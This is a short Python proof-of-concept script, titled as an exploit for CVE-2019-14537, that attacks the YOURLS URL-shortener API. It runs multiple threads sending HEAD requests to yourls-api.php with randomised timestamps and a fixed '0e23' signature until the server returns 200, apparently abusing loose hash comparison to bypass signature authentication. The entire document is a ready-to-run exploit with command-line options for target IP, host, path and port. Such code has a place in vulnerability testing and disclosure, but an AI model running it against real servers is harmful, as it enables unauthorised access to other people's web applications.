import socket
from time import time,sleep
import threading
import random
import string
from timeit import default_timer as timer
import argparse
import sys

start = timer()
found = False
numThreads = 10

def attack(ip, vhost, path, port, e):
    numRequests = 0
    global found

    current_time = str(time()).split(".")[0]

    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    c.connect((ip, int(port)))

    while(not found):
        try:
            payload = ''.join(random.choice(string.digits) for i in range(20))
            temp = str(current_time) + "." + str(payload)
            requestGET = "HEAD {}?timestamp={}&signature=0e23&action=stats HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\r\n".format(path, temp, vhost)
            c.send(requestGET.encode())
            r = c.recv(200).decode()

            if(len(r) == 0):
                c.close()
                c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                c.connect((ip, int(port)))

            if "200" in r:
                print("[+] 200 Code\n" + r)
                print("[+] Timestamp: {}".format(str(current_time) + "." + str(payload)))
                found = True

            if numRequests % 10 == 0 and e == 0:
                current_time = str(time()).split(".")[0]
                requestsMade = numThreads * numRequests
                elapsed = timer() - start
                reqPerSec = requestsMade / elapsed
                print("[*] {}r | {}r/s".format(requestsMade, int(reqPerSec)))
                sys.stdout.write("\033[F")

            numRequests += 1

        except Exception as e:
            print("[-] {})".format(e))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CVE-2019-14537 PoC')
    parser.add_argument('ip', metavar='ip', type=str, nargs='?',
                    help='Yourls IP')

    parser.add_argument('--vhost', default="127.0.0.1", help='host name (domain name)')
    parser.add_argument('--threads', default=numThreads, help='number of threads (default: 10)')
    parser.add_argument('--path', default="/yourls-api.php", help='yourls-api.php path (default: /yourls-api.php)')
    parser.add_argument('--port', default=80, help='port (default: 80)')

    args = parser.parse_args()

    if(args.ip != None):
    
        print("[*] Attacking {}:{} with {} threads".format(args.ip, args.port, args.threads))

        numThreads = int(args.threads)

        for i in range(0, int(args.threads)):
            x = threading.Thread(target=attack, args=(args.ip, args.vhost, args.path, args.port, i))
            x.start()
